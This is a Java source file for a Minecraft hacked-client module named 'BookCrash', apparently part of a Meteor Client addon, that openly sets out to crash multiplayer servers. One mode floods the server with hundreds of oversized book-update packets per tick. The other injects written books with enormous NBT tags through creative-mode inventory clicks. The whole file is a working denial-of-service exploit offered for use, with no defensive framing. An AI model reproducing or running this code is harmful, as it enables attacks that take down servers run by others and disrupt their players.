package com.crystaldevs.crystal.modules.crash;

import com.crystaldevs.crystal.CrystalAddon;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtList;
import net.minecraft.nbt.NbtString;
import net.minecraft.network.packet.c2s.play.BookUpdateC2SPacket;
import org.apache.commons.lang3.RandomStringUtils;

import java.util.ArrayList;
import java.util.Optional;

public class BookCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Mode> mode = sgGeneral.add(new EnumSetting.Builder<Mode>()
            .name("mode")
            .description("Which crash mode to use.")
            .defaultValue(Mode.BookUpdate)
            .build()
    );

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
            .name("amount")
            .description("How many packets to send to the server per tick.")
            .defaultValue(100)
            .min(1)
            .sliderMin(1)
            .sliderMax(1000)
            .visible(() -> mode.get() != Mode.Creative)
            .build()
    );

    private final Setting<Integer> bookPages = sgGeneral.add(new IntSetting.Builder()
            .name("pages")
            .description("How many pages to use.")
            .defaultValue(50)
            .min(0)
            .sliderMax(100)
            .visible(() -> mode.get() != Mode.Creative)
            .build()
    );

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
            .name("auto-disable")
            .description("Disables module on kick.")
            .defaultValue(true)
            .build()
    );

    private int slot = 5;

    public BookCrash() {
        super(CrystalAddon.CRYSTAL_CRASH_CATEGORY, "book-crash", "CRYSTAL || Attempts to crash the server by sending bad book sign packets.");
    }

    @Override
    public void onActivate() {
        slot = 5;
        if (mode.get() != Mode.Creative) return;
        if (!mc.player.getAbilities().creativeMode) {
            error("You must be in creative mode to use this.");
            toggle();
        }
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        switch (mode.get()) {
            case BookUpdate -> {
                for (int i = 0; i < amount.get(); i++) {
                    ArrayList<String> pages = new ArrayList<>();
                    String mm255 = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
                    String title = "/stop" + Math.random() * 400;
                    for (int j = 0; j < bookPages.get(); j++) pages.add(mm255);
                    mc.player.networkHandler.sendPacket(new BookUpdateC2SPacket(mc.player.getInventory().selectedSlot, pages, Optional.of(title)));
                }
            }
            case Creative -> {
                for (int i = 0; i < 5; i++) {
                    if (slot > 36 + 9) {
                        slot = 0;
                        return;
                    }
                    slot++;
                    ItemStack stack = new ItemStack(Items.WRITTEN_BOOK);
                    NbtCompound tag = new NbtCompound();
                    NbtList list = new NbtList();
                    for (int j = 0; j < 99; j++) list.add(NbtString.of("{\"text\":" + RandomStringUtils.randomAlphabetic(200) + "\"}"));
                    tag.put("author", NbtString.of(RandomStringUtils.randomAlphabetic(9000)));
                    tag.put("title", NbtString.of(RandomStringUtils.randomAlphabetic(25564)));
                    tag.put("pages", list);
                    stack.setNbt(tag);
                    mc.interactionManager.clickCreativeStack(stack, slot);
                }
            }
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }

    public enum Mode {
        BookUpdate,
        Creative
    }
}